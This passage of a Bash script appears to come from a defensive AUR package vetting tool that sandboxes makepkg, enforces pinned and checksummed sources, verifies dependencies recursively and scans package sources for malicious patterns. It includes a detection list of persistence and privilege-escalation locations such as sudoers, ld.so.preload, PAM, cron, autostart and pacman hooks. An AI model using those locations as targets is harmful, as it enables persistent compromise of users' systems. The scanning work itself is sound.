    PKGBUILD|*.sh|*.bash|*.zsh|*.fish|*.py|*.pyw|*.pl|*.rb|*.js|*.jsx|*.mjs|*.cjs|*.ts|*.tsx|*.lua|*.tcl|*.awk|*.inc|*.env|*.conf|*.cfg|*.rc|*.profile|*.mk|*.in|*.patch|*.diff|*.c|*.cc|*.cpp|*.cxx|*.h|*.hh|*.hpp|*.go|*.rs|*.java|*.kt|*.kts|*.scala|*.php|*.ps1|*.service|*.timer|*.socket|*.path|*.desktop|*.hook|*.install|*.cmake|CMakeLists.txt|meson.build|meson_options.txt|Makefile|GNUmakefile|makefile|configure|configure.ac|bootstrap|install|setup|build|run|package.json|package-lock.json|npm-shrinkwrap.json|pnpm-lock.yaml|yarn.lock|bun.lock|bun.lockb|pyproject.toml|requirements.txt|Cargo.toml|Cargo.lock|go.mod|go.sum)
      return 0
      ;;
  esac

  [[ -x "$file" ]] && return 0
  [[ $(head -c 2 "$file" 2>/dev/null) == '#!' ]]
}

_aur_guard_scan_source_tree() {
  local pkg="$1"
  local root="$2"
  local mode="${3:-recursive}"
  local file relative size
  local scanned=0
  local network_reference_files=0
  local matched=false
  local -a find_args

  [[ -d "$root" ]] || return 0

  local tree_bytes
  tree_bytes=$(du -sb --apparent-size "$root" 2>/dev/null | awk '{print $1}') || {
    _aur_guard_fail "could not determine total source-tree size for $pkg"
    return 1
  }
  if (( tree_bytes > _AUR_GUARD_TREE_MAX_BYTES )); then
    _aur_guard_fail "$pkg exceeds the total source-tree size limit"
    return 1
  fi

  find_args=("$root")
  if [[ "$mode" == 'top' ]]; then
    find_args+=(-maxdepth 1)
  fi
  find_args+=(
    -type f
    ! -path '*/.git/*'
    ! -path '*/.awtarchy-gnupg/*'
  )

  if [[ ${root%/} != */.awtarchy-cache ]]; then
    find_args+=(! -path '*/.awtarchy-cache/*')
  fi

  find_args+=(
    ! -path '*/.awtarchy-pkg/*'
    ! -path '*/.awtarchy-srcpkg/*'
    ! -path '*/.awtarchy-log/*'
    -print0
  )

  while IFS= read -r -d '' file; do
    relative="${file#"$root"/}"
    _aur_guard_source_candidate "$file" "$relative" || continue

    ((scanned += 1))
    if (( scanned > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
      _aur_guard_fail "$pkg contains more than $_AUR_GUARD_SOURCE_SCAN_MAX_FILES script or build files; refusing an incomplete source scan"
      return 1
    fi

    size=$(stat -c %s "$file" 2>/dev/null) || {
      _aur_guard_fail "could not determine source-file size: $relative"
      return 1
    }

    if (( size > _AUR_GUARD_SOURCE_SCAN_MAX_BYTES )); then
      _aur_guard_fail "$pkg contains a script-like source file larger than the scan limit: $relative"
      return 1
    fi

    /usr/bin/grep -Iq . "$file" || continue

    if /usr/bin/grep -Eq 'https?://|git(\+https)?://|ssh://' "$file"; then
      ((network_reference_files += 1))
    fi

    if /usr/bin/grep -HnEi "$_AUR_GUARD_SOURCE_HARD_BLOCK_RE" "$file"; then
      matched=true
    fi

    if /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_DOWNLOAD_RE" "$file" \
        && /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_EXEC_RE" "$file"; then
      printf '%s: contains both network-download and execution/persistence behavior\n' \
        "$file"
      matched=true
    fi

    if [[ ${relative##*/} == 'package.json' ]] \
        && /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" "$file"; then
      matched=true
    fi
  done < <(find "${find_args[@]}")

  if $matched; then
    _aur_guard_fail "known malicious or unsafe execution pattern found in downloaded source code for $pkg"
    return 1
  fi

  printf 'AUR Verify: scanned %d script/build files for %s.\n' \
    "$scanned" "$pkg"
  printf 'AUR Verify: %d scanned files referenced network URLs; those URLs were not crawled.\n' \
    "$network_reference_files"
}

_aur_guard_tree_has_name() {
  local root="$1"
  shift

  [[ -d "$root" ]] || return 1

  local name
  for name in "$@"; do
    if find "$root" -type f -name "$name" -print -quit 2>/dev/null | grep -q .; then
      return 0
    fi
  done

  return 1
}

_aur_guard_pkgbuild_uses_tool() {
  local pkgdir="$1"
  local tool_re="$2"

  /usr/bin/grep -Eq \
    "(^|[^[:alnum:]_.+-])(${tool_re})([^[:alnum:]_.+-]|$)" \
    "$pkgdir/PKGBUILD"
}

_aur_guard_validate_source_origins() {
  local pkgbase="$1"
  local srcinfo="$2"
  local source_value source_url

  while IFS= read -r source_value; do
    [[ -n "$source_value" ]] || continue
    source_url="${source_value#*::}"

    case "$source_url" in
      git+*|hg+*|svn+*|bzr+*)
        if [[ ! "$source_url" =~ \#commit=[0-9A-Fa-f]{40,64}([\&].*)?$ ]]; then
          _aur_guard_fail "$pkgbase has a VCS source that is not pinned to an exact commit hash: $source_value"
          return 1
        fi
        ;;
      http://*|ftp://*)
        _aur_guard_note_context_warning \
          "$pkgbase:source" \
          "unencrypted source transport is protected only by its declared checksum or signature: $source_value"
        ;;
    esac
  done < <(
    awk -F ' = ' '/^[[:space:]]*source(_[[:alnum:]_]+)? = / {print $2}' "$srcinfo"
  )
}

_aur_guard_validate_skipped_integrity() {
  local pkgbase="$1"
  local srcinfo="$2"

  if ! awk -F ' = ' '
    function trim(value) {
      gsub(/^[[:space:]]+|[[:space:]]+$/, "", value)
      return value
    }
    function source_suffix(key, suffix) {
      suffix = trim(key)
      sub(/^source/, "", suffix)
      return suffix
    }
    function checksum_suffix(key, suffix) {
      suffix = trim(key)
      sub(/^(b2|sha(224|256|384|512)|md5)sums/, "", suffix)
      return suffix
    }
    function strip_alias(value) {
      sub(/^.*::/, "", value)
      return value
    }
    function local_name(value, clean, count, parts) {
      clean = value
      if (clean ~ /::/) {
        sub(/::.*/, "", clean)
        return clean
      }
      clean = strip_alias(clean)
      sub(/[?#].*$/, "", clean)
      count = split(clean, parts, "/")
      return parts[count]
    }
    function is_remote(value, clean) {
      clean = strip_alias(value)
      return clean ~ /^([[:alpha:]][[:alnum:]+.-]*:|git\+|hg\+|svn\+|bzr\+)/
    }
    function exact_vcs(value, clean) {
      clean = strip_alias(value)
      return clean ~ /^(git|hg|svn|bzr)\+/ \
        && clean ~ /#commit=[0-9A-Fa-f]{40,64}([&].*)?$/
    }
    function is_signature(name) {
      return name ~ /\.(sig|sign|asc)$/
    }
    function signed_name(name) {
      sub(/\.(sig|sign|asc)$/, "", name)
      return name
    }
    /^[[:space:]]*validpgpkeys = / {
      fingerprint = trim($2)
      if (fingerprint !~ /^[0-9A-Fa-f]{40}$/           && fingerprint !~ /^[0-9A-Fa-f]{64}$/) {
        printf "Invalid validpgpkeys fingerprint: %s\n", fingerprint > "/dev/stderr"
        bad = 1
      }
      valid_pgp = 1
      next
    }
    /^[[:space:]]*source(_[[:alnum:]_]+)? = / {
      suffix = source_suffix($1)
      i = ++source_count[suffix]
      source[suffix SUBSEP i] = $2
      next
    }
    /^[[:space:]]*(b2|sha256|sha384|sha512)sums(_[[:alnum:]_]+)? = / {
      suffix = checksum_suffix($1)
      i = ++checksum_count[$1]
      if ($2 != "SKIP") strong[suffix SUBSEP i] = 1
      next
    }
    END {
      for (suffix in source_count) {
        for (i = 1; i <= source_count[suffix]; i++) {
          key = suffix SUBSEP i
          name = local_name(source[key])
          source_name[suffix SUBSEP name] = 1
          if (strong[key]) strong_name[suffix SUBSEP name] = 1
          if (is_signature(name)) {
            signature_for[suffix SUBSEP signed_name(name)] = 1
          }
        }
      }

      for (suffix in source_count) {
        for (i = 1; i <= source_count[suffix]; i++) {
          key = suffix SUBSEP i
          value = source[key]
          name = local_name(value)

          if (!is_remote(value) || exact_vcs(value) || strong[key]) continue

          if (valid_pgp && is_signature(name) \
              && source_name[suffix SUBSEP signed_name(name)]) continue

          if (valid_pgp && signature_for[suffix SUBSEP name]) continue

          printf "Source lacks a strong checksum, exact VCS commit, or matching pinned PGP signature: %s\n", \
            value > "/dev/stderr"
          bad = 1
        }
      }
      exit bad
    }
  ' "$srcinfo"; then
    _aur_guard_fail "$pkgbase contains a remote source without strong immutable integrity verification"
    return 1
  fi
}

_aur_guard_validate_dependency_evidence() {
  local pkgbase="$1"
  local srcinfo="$2"
  local pkgdir="$3"
  local source_root="$4"
  local dep_spec dep_name
  local package_json=false
  local js_source=false
  local js_lock=false
  local manager

  if _aur_guard_tree_has_name "$source_root" package.json; then
    package_json=true
  fi

  if find "$source_root" -type f \
      \( -name '*.js' -o -name '*.jsx' -o -name '*.mjs' -o -name '*.cjs' \
         -o -name '*.ts' -o -name '*.tsx' \) \
      -print -quit 2>/dev/null | grep -q .; then
    js_source=true
  fi

  if _aur_guard_tree_has_name "$source_root" \
      package-lock.json npm-shrinkwrap.json pnpm-lock.yaml yarn.lock bun.lock bun.lockb; then
    js_lock=true
  fi

  while IFS= read -r dep_spec; do
    [[ -n "$dep_spec" ]] || continue
    dep_name=$(_aur_guard_dependency_name "$dep_spec")
    [[ -n "$dep_name" ]] || continue

    manager=''
    case "$dep_name" in
      bun|bun-bin|bun-git) manager='bun' ;;
      npm) manager='npm' ;;
      pnpm|pnpm-bin) manager='pnpm' ;;
      yarn|yarn-berry) manager='yarn' ;;
    esac

    if [[ -n "$manager" ]]; then
      if ! $package_json; then
        _aur_guard_fail "$pkgbase declares $dep_name but its verified source has no package.json"
        return 1
      fi

      if ! _aur_guard_pkgbuild_uses_tool "$pkgdir" "$manager"; then
        _aur_guard_note_context_warning \
          "$pkgbase:$dep_name" \
          "$dep_name is declared and package.json exists, but the PKGBUILD does not directly invoke $manager"
      fi

      if ! $js_lock; then
        _aur_guard_note_context_warning \
          "$pkgbase:$dep_name" \
          "$dep_name is declared and package.json exists, but no recognized JavaScript lockfile was found"
      else
        printf 'AUR Verify: %s dependency %s matches JavaScript project manifests.\n' \
          "$pkgbase" "$dep_name"
      fi
    fi

    case "$dep_name" in
      nodejs|nodejs-lts-*)
        if ! $package_json && ! $js_source \
            && ! _aur_guard_pkgbuild_uses_tool "$pkgdir" 'node|nodejs'; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "$dep_name is declared but no package.json, JavaScript/TypeScript source, or direct Node.js build usage was found"
        fi
        ;;
      cargo|rust|rustup)
        if ! _aur_guard_tree_has_name "$source_root" Cargo.toml; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "$dep_name is declared but no Cargo.toml was found in the verified source"
        fi
        ;;
      go)
        if ! _aur_guard_tree_has_name "$source_root" go.mod; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "Go is declared but no go.mod was found in the verified source"
        fi
        ;;
      cmake)
        if ! _aur_guard_tree_has_name "$source_root" CMakeLists.txt; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "CMake is declared but no CMakeLists.txt was found in the verified source"
        fi
        ;;
      meson)
        if ! _aur_guard_tree_has_name "$source_root" meson.build; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "Meson is declared but no meson.build was found in the verified source"
        fi
        ;;
    esac
  done < <(
    awk -F ' = ' '
      /^[[:space:]]*(depends|makedepends|checkdepends)(_[[:alnum:]_]+)? = / {
        print $2
      }
    ' "$srcinfo" | LC_ALL=C sort -u
  )
}

_aur_guard_record_required_package() {
  local pkgbase="$1"
  local pkgname="$2"
  local line

  line="$pkgbase"$'\t'"$pkgname"
  grep -Fqx -- "$line" "$_AUR_GUARD_REQUIRED_PACKAGES" 2>/dev/null \
    || printf '%s\n' "$line" >> "$_AUR_GUARD_REQUIRED_PACKAGES"
}

_aur_guard_record_repo_dependency() {
  local pkg="$1"
  [[ -n "$pkg" ]] || return 0
  _aur_guard_validate_package_name "$pkg" || return 1
  grep -Fqx -- "$pkg" "$_AUR_GUARD_REPO_DEPS" 2>/dev/null \
    || printf '%s\n' "$pkg" >> "$_AUR_GUARD_REPO_DEPS"
}

_aur_guard_scan_package_files() {
  local pkg="$1"
  local pkgdir="$2"
  local matched=false

  printf 'AUR Verify: scanning %s for known malicious patterns.\n' "$pkg"

  if grep -rInE \
      --exclude-dir='.git' \
      --binary-files=without-match \
      "$_AUR_GUARD_HARD_BLOCK_RE" \
      "$pkgdir"; then
    matched=true
  fi

  local hook_matches package_json_matches

  hook_matches=$(find "$pkgdir" -type f -name '*.install' \
    -exec /usr/bin/grep -HnE "$_AUR_GUARD_HOOK_BLOCK_RE" {} + 2>/dev/null) || true
  if [[ -n "$hook_matches" ]]; then
    printf '%s\n' "$hook_matches"
    matched=true
  fi

  package_json_matches=$(find "$pkgdir" -type f -name 'package.json' \
    -exec /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" {} + 2>/dev/null) || true
  if [[ -n "$package_json_matches" ]]; then
    printf '%s\n' "$package_json_matches"
    matched=true
  fi

  if $matched; then
    _aur_guard_fail "known malicious or unsafe execution pattern found in $pkg"
    return 1
  fi

  grep -rInE \
    --exclude-dir='.git' \
    --include='PKGBUILD' \
    --include='*.install' \
    '^[[:space:]]*install=|post_install|post_upgrade|pre_install|pre_upgrade|setcap|chmod[[:space:]].*[+u]s|systemctl' \
    "$pkgdir" || true

  _aur_guard_scan_source_tree "$pkg" "$pkgdir" recursive
}

_aur_guard_verify_srcinfo() {
  local pkg="$1"
  local pkgdir="$2"
  local generated="$pkgdir/.SRCINFO.awtarchy"

  [[ -f "$pkgdir/.SRCINFO" ]] || {
    _aur_guard_fail "$pkg has no committed .SRCINFO"
    return 1
  }

  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny readonly \
      --printsrcinfo > "$generated"; then
    rm -f "$generated"
    _aur_guard_fail "could not regenerate .SRCINFO for $pkg inside the sandbox"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkg" "$pkgdir" || {
    rm -f "$generated"
    return 1
  }

  if ! diff -u "$pkgdir/.SRCINFO" "$generated"; then
    rm -f "$generated"
    _aur_guard_fail "$pkg has a PKGBUILD/.SRCINFO mismatch"
    return 1
  fi

  mv -f "$generated" "$pkgdir/.SRCINFO.verified"
}

_aur_guard_validate_checkout_tree() {
  local pkgbase="$1"
  local pkgdir="$2"
  local entry count tree_bytes

  [[ -f "$pkgdir/PKGBUILD" && ! -L "$pkgdir/PKGBUILD" ]] || {
    _aur_guard_fail "$pkgbase does not contain a regular PKGBUILD"
    return 1
  }
  [[ -f "$pkgdir/.SRCINFO" && ! -L "$pkgdir/.SRCINFO" ]] || {
    _aur_guard_fail "$pkgbase does not contain a regular committed .SRCINFO"
    return 1
  }

  entry=$(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o \
    \( -type l -o ! -type d ! -type f \) -print -quit 2>/dev/null)
  if [[ -n "$entry" ]]; then
    _aur_guard_fail "$pkgbase contains a symbolic link or special file in its AUR checkout: ${entry#"$pkgdir"/}"
    return 1
  fi

  count=$(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o -type f -print \
    | wc -l) || return 1
  if (( count > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
    _aur_guard_fail "$pkgbase AUR checkout contains too many files"
    return 1
  fi

  tree_bytes=$(du -sb --apparent-size --exclude=.git "$pkgdir" 2>/dev/null \
    | awk '{print $1}') || return 1
  if (( tree_bytes > _AUR_GUARD_TREE_MAX_BYTES )); then
    _aur_guard_fail "$pkgbase AUR checkout exceeds the size limit"
    return 1
  fi
}

_aur_guard_fetch_package() {
  local pkg="$1"
  local fetch_parent="$2"
  local pkgbase remote pkgdir

  _aur_guard_validate_package_name "$pkg" || return 1
  pkgbase=$(_aur_guard_rpc_package_base "$pkg") || return 1
  [[ -n "$pkgbase" ]] || return 1
  _aur_guard_validate_package_name "$pkgbase" || return 1

  mkdir -p "$fetch_parent" || return 1
  pkgdir="$fetch_parent/$pkgbase"
  rm -rf "$pkgdir"

  if ! _aur_guard_sandbox_exec \
      "$fetch_parent" allow writable / \
      /usr/bin/git clone \
        --quiet \
        --no-hardlinks \
        -- "https://aur.archlinux.org/${pkgbase}.git" "/work/$pkgbase"; then
    return 1
  fi

  [[ -d "$pkgdir/.git" ]] || return 1
  _aur_guard_validate_checkout_tree "$pkgbase" "$pkgdir" || return 1
  remote=$(command git -C "$pkgdir" remote get-url origin 2>/dev/null) || return 1
  _aur_guard_validate_official_remote "$pkgbase" "$remote" || return 1

  printf '%s\n' "$pkgdir"
}

_aur_guard_verify_package_recursive() {
  local pkg="$1"
  local parent="$2"
  local fetch_parent pkgdir pkgbase fetched_pkgbase commit remote srcinfo
  local split_pkg dep_spec dep_name provider exact_aur_pkg
  local -a providers=()

  [[ -n "$pkg" ]] || return 1
  _aur_guard_validate_package_name "$pkg" || return 1

  if [[ ${_AUR_GUARD_REQUEST_STATE[$pkg]+set} ]]; then
    case "${_AUR_GUARD_REQUEST_STATE[$pkg]}" in
      done) return 0 ;;
      active) return 0 ;;
      failed) return 1 ;;
    esac
  fi
  _AUR_GUARD_REQUEST_STATE[$pkg]='active'

  if ! _aur_guard_check_emergency_block "$pkg"; then
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkg is present on the Awtarchy emergency blocklist"
    return 1
  fi
  _aur_guard_note_historical_match "$pkg"

  fetch_parent="$_AUR_GUARD_WORK_DIR/fetch/${pkg//[^a-zA-Z0-9._+-]/_}"
  rm -rf "$fetch_parent"

  pkgdir=$(_aur_guard_fetch_package "$pkg" "$fetch_parent") || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "failed to fetch AUR package $pkg"
    return 1
  }
  fetched_pkgbase="${pkgdir##*/}"

  _aur_guard_scan_package_files "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_verify_srcinfo "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  srcinfo="$pkgdir/.SRCINFO.verified"
  pkgbase=$(awk -F ' = ' '/^[[:space:]]*pkgbase = / {print $2; exit}' "$srcinfo")
  [[ -n "$pkgbase" ]] || pkgbase="$pkg"
  _aur_guard_validate_package_name "$pkgbase" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }
  if [[ "$pkgbase" != "$fetched_pkgbase" ]]; then
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkg committed .SRCINFO reports package base $pkgbase but the official AUR RPC returned $fetched_pkgbase"
    return 1
  fi
  _aur_guard_record_required_package "$pkgbase" "$pkg"

  if [[ ${_AUR_GUARD_BASE_STATE[$pkgbase]+set} ]]; then
    case "${_AUR_GUARD_BASE_STATE[$pkgbase]}" in
      done|active)
        _AUR_GUARD_REQUEST_STATE[$pkg]='done'
        rm -rf "$fetch_parent"
        return 0
        ;;
      failed)
        _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
        rm -rf "$fetch_parent"
        return 1
        ;;
    esac
  fi
  _AUR_GUARD_BASE_STATE[$pkgbase]='active'

  if ! _aur_guard_check_emergency_block "$pkgbase"; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkgbase is present on the Awtarchy emergency blocklist"
    return 1
  fi
  _aur_guard_note_historical_match "$pkgbase"

  while IFS= read -r split_pkg; do
    [[ -n "$split_pkg" ]] || continue
    _aur_guard_validate_package_name "$split_pkg" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }
    if ! _aur_guard_check_emergency_block "$split_pkg"; then
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      _aur_guard_fail "$split_pkg from package base $pkgbase is emergency-blocked"
      return 1
    fi
    _aur_guard_note_historical_match "$split_pkg"
  done < <(awk -F ' = ' '/^[[:space:]]*pkgname = / {print $2}' "$srcinfo")

  _aur_guard_validate_source_origins "$pkgbase" "$srcinfo" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_validate_skipped_integrity "$pkgbase" "$srcinfo" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_prepare_public_keyring "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  printf 'AUR Verify: verifying downloaded sources for %s inside bubblewrap.\n' "$pkgbase"
  if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
      --verifysource --noconfirm --nocolor; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "source checksum or PGP verification failed for $pkgbase"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_scan_source_tree "$pkgbase" "$pkgdir" top || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  rm -rf "$pkgdir/.awtarchy-build"
  mkdir -p "$pkgdir/.awtarchy-build" || return 1

  printf 'AUR Verify: extracting verified sources for %s inside an offline sandbox.\n' "$pkgbase"
  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny writable \
      --nobuild --noprepare --noverify --nodeps --holdver --noconfirm --nocolor; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not safely extract verified sources for $pkgbase"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_scan_source_tree "$pkgbase" "$pkgdir/.awtarchy-build" recursive || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_validate_dependency_evidence \
    "$pkgbase" "$srcinfo" "$pkgdir" "$pkgdir/.awtarchy-build" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  commit=$(git -C "$pkgdir" rev-parse HEAD 2>/dev/null) || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not read AUR commit for $pkgbase"
    return 1
  }
  remote=$(git -C "$pkgdir" remote get-url origin 2>/dev/null) || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not read AUR remote for $pkgbase"
    return 1
  }
  _aur_guard_validate_official_remote "$pkgbase" "$remote" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  while IFS= read -r dep_spec; do
    [[ -n "$dep_spec" ]] || continue
    dep_name=$(_aur_guard_dependency_name "$dep_spec")
    [[ -n "$dep_name" ]] || continue
    _aur_guard_validate_package_name "$dep_name" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }

    if ! _aur_guard_check_emergency_block "$dep_name"; then
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      _aur_guard_fail "$pkgbase depends on emergency-blocked package $dep_name"
      return 1
    fi

    provider=$(_aur_guard_find_installed_provider "$dep_name")
    if [[ -n "$provider" ]] && command pacman -T "$dep_spec" >/dev/null 2>&1; then
      if command pacman -Qm "$provider" >/dev/null 2>&1; then
        printf 'AUR Verify: %s depends on installed foreign package %s.\n' "$pkgbase" "$provider"
        _aur_guard_verify_package_recursive "$provider" "$pkgbase" || {
          _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
          _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
          return 1
        }
      else
        printf 'AUR Verify: %s dependency %s is satisfied by repository package %s.\n' \
          "$pkgbase" "$dep_name" "$provider"
        _aur_guard_record_repo_dependency "$provider"
      fi
      continue
    fi

    if _aur_guard_repo_package_satisfies "$dep_spec" "$dep_name"; then
      printf 'AUR Verify: %s dependency %s is available from an enabled repository.\n' \
        "$pkgbase" "$dep_name"
      _aur_guard_record_repo_dependency "$dep_name"
      continue
    fi

    exact_aur_pkg=$(_aur_guard_rpc_exact_package "$dep_name")
    if [[ -n "$exact_aur_pkg" ]]; then
      _aur_guard_verify_package_recursive "$exact_aur_pkg" "$pkgbase" || {
        _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
        _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
        return 1
      }
      continue
    fi

    mapfile -t providers < <(_aur_guard_rpc_providers "$dep_name")
    if (( ${#providers[@]} == 1 )); then
      printf 'AUR Verify: resolved virtual dependency %s to AUR package %s.\n' \
        "$dep_name" "${providers[0]}"
      _aur_guard_verify_package_recursive "${providers[0]}" "$pkgbase" || {
        _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
        _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
        return 1
      }
      continue
    fi

    if (( ${#providers[@]} > 1 )); then
      _aur_guard_fail "$pkgbase has ambiguous AUR dependency $dep_name"
      printf 'Possible providers:\n' >&2
      printf '  %s\n' "${providers[@]}" >&2
    else
      _aur_guard_fail "$pkgbase has unresolved dependency $dep_spec"
    fi
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  done < <(
    awk -F ' = ' '
      /^[[:space:]]*(depends|makedepends|checkdepends)(_[[:alnum:]_]+)? = / {
        print $2
      }
    ' "$srcinfo" | LC_ALL=C sort -u
  )

  # Append after dependencies so the manifest is in build order: dependencies first.
  printf '%s\t%s\t%s\t%s\t%s\n' \
    "$pkgbase" "$commit" "$remote" "$parent" "$pkgdir" \
    >> "$_AUR_GUARD_MANIFEST"

  _AUR_GUARD_BASE_STATE[$pkgbase]='done'
  _AUR_GUARD_REQUEST_STATE[$pkg]='done'
  return 0
}

_aur_guard_recheck_commits() {
  local pkgbase expected remote parent pkgdir current temp

  temp=$(mktemp -d) || return 1

  while IFS=$'\t' read -r pkgbase expected remote parent pkgdir; do
    [[ -n "$pkgbase" ]] || continue
    _aur_guard_validate_official_remote "$pkgbase" "$remote" || {
      rm -rf "$temp"
      return 1
    }

    current=$(
      _aur_guard_sandbox_exec "$temp" allow writable / \
        /usr/bin/git ls-remote -- "$remote" HEAD 2>/dev/null \
        | awk 'NR == 1 {print $1}'
    )

    if [[ -z "$current" ]]; then
      rm -rf "$temp"
      _aur_guard_fail "could not recheck current AUR commit for $pkgbase"
      return 1
    fi

    if [[ "$current" != "$expected" ]]; then
      rm -rf "$temp"
      _aur_guard_fail "$pkgbase changed after verification"
      printf 'Verified: %s\nCurrent:  %s\n' "$expected" "$current" >&2
      return 1
    fi
  done < "$_AUR_GUARD_MANIFEST"

  rm -rf "$temp"
}

_aur_guard_prepare_build_root() {
  local build_root="$1"
  local -a repo_packages=(base-devel)
  local dep

  if [[ -s "$_AUR_GUARD_REPO_DEPS" ]]; then
    while IFS= read -r dep; do
      [[ -n "$dep" ]] && repo_packages+=("$dep")
    done < <(LC_ALL=C sort -u "$_AUR_GUARD_REPO_DEPS")
  fi

  sudo rm -rf -- "$build_root"
  sudo mkdir -p -- "$(dirname -- "$build_root")" || return 1

  printf 'AUR Guard: creating a disposable clean Arch build root.\n'
  sudo mkarchroot "$build_root" "${repo_packages[@]}"
}

_aur_guard_install_prior_artifacts_into_root() {
  local build_root="$1"
  local pkgbase pkgname artifact hash
  local copied_dir="$build_root/tmp/awtarchy-dependencies"
  local -a copied=()

  [[ -s "$_AUR_GUARD_ARTIFACTS" ]] || return 0

  sudo install -d -m 0755 "$copied_dir" || return 1

  while IFS=$'\t' read -r pkgbase pkgname artifact hash; do
    [[ -n "$artifact" && -f "$artifact" ]] || continue
    sudo install -m 0644 -- "$artifact" "$copied_dir/$(basename -- "$artifact")" || return 1
    copied+=("/tmp/awtarchy-dependencies/$(basename -- "$artifact")")
  done < "$_AUR_GUARD_ARTIFACTS"

  (( ${#copied[@]} > 0 )) || return 0

  sudo arch-nspawn "$build_root" \
    --private-network \
    /usr/bin/pacman -U --noconfirm --needed "${copied[@]}"
}

_aur_guard_artifact_name() {
  local artifact="$1"
  command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
    | awk -F ' = ' '$1 == "pkgname" {print $2; exit}'
}

_aur_guard_artifact_path_is_blocked() {
  local relative="$1"

  case "$relative" in
    .INSTALL|\
    etc/sudoers|etc/sudoers.d/*|\
    etc/pam.d/*|usr/lib/security/*|\
    etc/ld.so.preload|etc/ld.so.conf.d/*|usr/lib/ld.so.conf.d/*|\
    etc/profile|etc/profile.d/*|etc/bash.bashrc|\
    etc/cron*|usr/lib/cron/*|usr/bin/crontab|\
    etc/xdg/autostart/*|usr/share/autostart/*|\
    usr/share/libalpm/hooks/*|\
    usr/lib/systemd/system-preset/*|usr/lib/systemd/user-preset/*|\
    usr/lib/systemd/system-generators/*|usr/lib/systemd/user-generators/*|\
    usr/lib/systemd/system-environment-generators/*|usr/lib/systemd/user-environment-generators/*|\
